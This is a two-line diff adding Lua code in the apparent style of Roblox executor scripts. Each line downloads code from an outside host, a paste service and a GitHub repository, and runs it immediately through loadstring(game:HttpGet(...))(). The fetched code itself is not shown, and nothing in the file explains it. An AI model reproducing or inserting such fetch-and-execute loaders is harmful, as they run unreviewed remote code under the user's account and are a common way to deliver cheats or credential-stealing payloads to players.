@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vQ6ugJJtdq71sQIl/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/PublicScripts/refs/heads/main/LoadingScreenn"))()
